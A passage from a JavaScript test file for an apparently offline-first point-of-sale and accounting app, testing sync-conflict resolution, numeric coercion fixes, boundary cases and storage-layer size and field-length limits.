    expect(winner.venteNet).toBe(1800); // remote is newer
  });

  it('sync conflict — local newer than server: local wins', () => {
    const local  = { venteNet: 1500, updatedAt: '2026-03-31T16:00:00Z' };
    const remote = { venteNet: 1200, updatedAt: '2026-03-31T14:00:00Z' };

    const winner = new Date(local.updatedAt) > new Date(remote.updatedAt) ? local : remote;
    expect(winner.venteNet).toBe(1500);
  });

  it('sync with identical timestamps uses local as tiebreaker', () => {
    const local  = { venteNet: 1500, updatedAt: '2026-03-31T14:00:00Z' };
    const remote = { venteNet: 1800, updatedAt: '2026-03-31T14:00:00Z' };

    // Tiebreaker: prefer local (offline-first principle)
    const sameTs = new Date(local.updatedAt).getTime() === new Date(remote.updatedAt).getTime();
    const winner = sameTs ? local : (new Date(local.updatedAt) > new Date(remote.updatedAt) ? local : remote);
    expect(winner.venteNet).toBe(1500);
  });
});


// ═════════════════════════════════════════════════════════════════════════════
// ADDITIONAL ABUSE — BOUNDARY COMBINATIONS
// ═════════════════════════════════════════════════════════════════════════════

describe('Boundary combinations', () => {
  it('stepped royalty rate with no paliers returns 0 (no crash)', () => {
    expect(calcSteppedRoyaltyRate(50000, [])).toBe(0);
    expect(calcSteppedRoyaltyRate(50000, null)).toBe(0);
  });

  it('stepped royalty rate with sales below all tiers uses lowest tier rate', () => {
    const paliers = [
      { minVentes: 0,     rate: 4 },
      { minVentes: 30000, rate: 3.5 },
      { minVentes: 50000, rate: 3 },
    ];
    expect(calcSteppedRoyaltyRate(100, paliers)).toBe(4); // matches minVentes: 0
  });

  it('calcInvoiceBalance never returns negative (credit notes produce 0 balance)', () => {
    // Invoice total $200, payments $250 (overpaid / credit note applied)
    const balance = calcInvoiceBalance(200, [{ montant: 250 }]);
    expect(balance).toBe(0); // Math.max(0, …) guard
  });

  it('calcTotalOutstanding with fully paid invoices returns 0', () => {
    const invoices = [
      { total: 300, paiements: [{ montant: 300 }] },
      { total: 150, paiements: [{ montant: 150 }] },
    ];
    expect(calcTotalOutstanding(invoices)).toBe(0);
  });

  it('calcPasseParHeure with null start returns null (not 0)', () => {
    expect(calcPasseParHeure(null, 0, 5)).toBe(null);
  });

  it('calcProjectionFinDeJour with 0 consumed returns null', () => {
    expect(calcProjectionFinDeJour(0, 0)).toBe(null);
  });

  it('computeEncaisseChain with an opening override on day 1 ignores prior closing', () => {
    const chain = computeEncaisseChain([
      { cashVentes: 500, autresEntrees: 0, depots: 200, sorties: 50, physicalCount: null, openingOverride: 1000 },
    ]);
    expect(chain[0].opening).toBe(1000);
    expect(chain[0].calculated).toBe(r2(1000 + 500 - 200 - 50));
  });

  it('emoji-only cashier name stored in audit_log does not corrupt the table', () => {
    expect(() =>
      db.prepare(
        "INSERT INTO audit_log (device_id, module, action, record_type, record_id, user_name) VALUES (?,?,?,?,?,?)"
      ).run('DEV-001', 'caisses', 'close', 'daily', '2026-03-31', '😀👋')
    ).not.toThrow();

    const row = db.prepare("SELECT user_name FROM audit_log WHERE record_id = '2026-03-31'").get();
    expect(row.user_name).toBe('😀👋');
  });

  it('500-char note stored in audit_log.reason survives round-trip intact', () => {
    const longReason = 'X'.repeat(500);
    db.prepare(
      "INSERT INTO audit_log (device_id, module, action, record_type, record_id, reason) VALUES (?,?,?,?,?,?)"
    ).run('DEV-001', 'caisses', 'note', 'daily', '2026-03-31', longReason);

    const row = db.prepare("SELECT reason FROM audit_log WHERE record_id = '2026-03-31'").get();
    expect(row.reason.length).toBe(500);
  });
});


// ═════════════════════════════════════════════════════════════════════════════
// REGRESSION TESTS FOR THE THREE FIXED NaN GAPS
// ═════════════════════════════════════════════════════════════════════════════

describe('Fix regression — calcManualTotal now uses parseFloat coercion', () => {
  it('string numbers coerce correctly ("42.50" → 42.50)', () => {
    expect(calcManualTotal('42.50', '100', '0')).toBe(142.50);
  });

  it('alpha strings coerce to 0 (not NaN)', () => {
    expect(calcManualTotal('abc', 'xyz', 'qrs')).toBe(0);
    expect(Number.isNaN(calcManualTotal('abc', 'xyz', 'qrs'))).toBe(false);
  });

  it('null / undefined coerce to 0', () => {
    expect(calcManualTotal(null, undefined, null)).toBe(0);
  });

  it('mixed: one valid number, two strings → sums only the valid one', () => {
    expect(calcManualTotal(500, 'bad', null)).toBe(500);
  });

  it('empty string coerces to 0', () => {
    expect(calcManualTotal('', '', '')).toBe(0);
  });
});

describe('Fix regression — calcInvoiceLine now uses parseFloat coercion', () => {
  it('string qty / price coerce correctly', () => {
    expect(calcInvoiceLine('3', '10.00')).toBe(30);
  });

  it('alpha strings produce 0 (not NaN)', () => {
    expect(calcInvoiceLine('many', 'expensive')).toBe(0);
    expect(Number.isNaN(calcInvoiceLine('many', 'expensive'))).toBe(false);
  });

  it('string remise coerces (e.g. "10" = 10% discount)', () => {
    expect(calcInvoiceLine(2, 100, '10')).toBe(180); // 2 × $100 × (1 − 0.10)
  });

  it('alpha remise coerces to 0 (no discount applied)', () => {
    expect(calcInvoiceLine(2, 100, 'dix')).toBe(200); // no discount
  });

  it('empty string qty produces 0', () => {
    expect(calcInvoiceLine('', 100)).toBe(0);
  });
});

describe('Fix regression — calcLabourCost now uses parseFloat coercion', () => {
  it('string hours / wage coerce correctly', () => {
    expect(calcLabourCost([{ hours: '8', wage: '15.25' }])).toBe(122);
  });

  it('alpha hours / wage coerce to 0 (no contribution to total)', () => {
    const cost = calcLabourCost([{ hours: 'huit', wage: 'quinze' }]);
    expect(cost).toBe(0);
    expect(Number.isNaN(cost)).toBe(false);
  });

  it('mixed roster: valid + invalid entries — invalid contributes 0', () => {
    const employees = [
      { hours: 8, wage: 15.25 },       // $122 valid
      { hours: 'bad', wage: 'bad' },   // $0 (coerced)
      { hours: 6, wage: 14.00 },       // $84 valid
    ];
    expect(calcLabourCost(employees)).toBe(206);
  });

  it('null hours coerce to 0 — employee with no hours logged contributes $0', () => {
    expect(calcLabourCost([{ hours: null, wage: 15.25 }])).toBe(0);
  });
});


// ═════════════════════════════════════════════════════════════════════════════
// STORAGE LAYER — FIELD LENGTH ENFORCEMENT (database.js storageSet)
// ═════════════════════════════════════════════════════════════════════════════

// Inline the same logic as database.js storageSet so these tests run without Electron.
const KV_MAX_BYTES = 10 * 1024 * 1024;
const FIELD_MAX_LEN_TEST = 500;
const FREE_TEXT_KEYS_TEST = new Set([
  'notes', 'note', 'nom', 'name', 'prénom', 'reason', 'description',
  'adresse', 'address', 'ville', 'city', 'telephone', 'email', 'courriel',
  'companyName', 'nomEntreprise', 'footerText', 'defaultNotes',
  'whiteLabelName', 'cashierName', 'caissierNom',
]);

function clampFreeTextFieldsTest(obj) {
  if (typeof obj !== 'object' || obj === null) return obj;
  if (Array.isArray(obj)) return obj.map(clampFreeTextFieldsTest);
  const out = {};
  for (const [k, v] of Object.entries(obj)) {
    if (typeof v === 'string' && FREE_TEXT_KEYS_TEST.has(k) && v.length > FIELD_MAX_LEN_TEST) {
      out[k] = v.slice(0, FIELD_MAX_LEN_TEST);
    } else if (typeof v === 'object' && v !== null) {
      out[k] = clampFreeTextFieldsTest(v);
    } else {
      out[k] = v;
    }
  }
  return out;
}

function simulateStorageSet(key, value) {
  if (typeof value !== 'string') throw new TypeError('value must be a JSON string');
  if (Buffer.byteLength(value, 'utf8') > KV_MAX_BYTES) throw new RangeError('exceeds 10 MB limit');
  let sanitised = value;
  try {
    const parsed = JSON.parse(value);
    sanitised = JSON.stringify(clampFreeTextFieldsTest(parsed));
  } catch { /* non-JSON string, pass through */ }
  // Write to test DB
  db.prepare('INSERT OR REPLACE INTO kv_store (key, value) VALUES (?, ?)').run(key, sanitised);
  return true;
}

describe('Storage layer — 10 MB payload guard', () => {
  it('accepts a normal-sized payload without error', () => {
    const payload = JSON.stringify({ venteNet: 1200, notes: 'Normal day.' });
    expect(() => simulateStorageSet('test-normal', payload)).not.toThrow();
  });

  it('rejects a payload exceeding 10 MB', () => {
    const huge = JSON.stringify({ blob: 'X'.repeat(11 * 1024 * 1024) });
    expect(() => simulateStorageSet('test-huge', huge)).toThrow(RangeError);
  });

  it('rejects a non-string value (catches accidental object pass-through)', () => {
    expect(() => simulateStorageSet('test-obj', { key: 'oops' })).toThrow(TypeError);
  });
});

describe('Storage layer — free-text field clamping at 500 chars', () => {
  it('clamps "notes" field to 500 characters', () => {
    const payload = JSON.stringify({ notes: 'A'.repeat(600) });
    simulateStorageSet('test-clamp-notes', payload);
    const row = db.prepare("SELECT value FROM kv_store WHERE key = 'test-clamp-notes'").get();
    expect(JSON.parse(row.value).notes.length).toBe(500);
  });

  it('clamps "name" field to 500 characters', () => {
    const payload = JSON.stringify({ name: 'B'.repeat(700) });
    simulateStorageSet('test-clamp-name', payload);
    const row = db.prepare("SELECT value FROM kv_store WHERE key = 'test-clamp-name'").get();
    expect(JSON.parse(row.value).name.length).toBe(500);
  });

  it('clamps "nom" (cashier name) to 500 characters', () => {
    const payload = JSON.stringify({ nom: 'C'.repeat(800) });
    simulateStorageSet('test-clamp-nom', payload);
    const row = db.prepare("SELECT value FROM kv_store WHERE key = 'test-clamp-nom'").get();
    expect(JSON.parse(row.value).nom.length).toBe(500);
  });

  it('does NOT clamp numeric fields (venteNet, interac, etc.)', () => {
    const payload = JSON.stringify({ venteNet: 999999999.99, interac: 12345.67 });
    simulateStorageSet('test-numeric', payload);
    const row = db.prepare("SELECT value FROM kv_store WHERE key = 'test-numeric'").get();
    const parsed = JSON.parse(row.value);
    expect(parsed.venteNet).toBe(999999999.99);
    expect(parsed.interac).toBe(12345.67);
  });

  it('clamps nested free-text fields inside arrays (e.g. employee roster)', () => {
    const payload = JSON.stringify({
      employees: [
        { name: 'D'.repeat(600), hours: 8 },
        { name: 'Valid Name',    hours: 6 },
      ],
    });
    simulateStorageSet('test-nested', payload);
    const row = db.prepare("SELECT value FROM kv_store WHERE key = 'test-nested'").get();
    const parsed = JSON.parse(row.value);
    expect(parsed.employees[0].name.length).toBe(500);
    expect(parsed.employees[0].hours).toBe(8);         // numeric unchanged
    expect(parsed.employees[1].name).toBe('Valid Name'); // short name unchanged
  });

  it('stores exactly 500-char strings without trimming', () => {
    const exactly500 = 'E'.repeat(500);
    simulateStorageSet('test-exact', JSON.stringify({ notes: exactly500 }));
    const row = db.prepare("SELECT value FROM kv_store WHERE key = 'test-exact'").get();
    expect(JSON.parse(row.value).notes.length).toBe(500);
  });

  it('non-JSON raw string value is stored as-is (size already checked)', () => {
    // Some legacy callers may store plain strings, not JSON
    const raw = 'plain-string-value';
    simulateStorageSet('test-raw', raw);
    const row = db.prepare("SELECT value FROM kv_store WHERE key = 'test-raw'").get();
    expect(row.value).toBe(raw);
  });
});
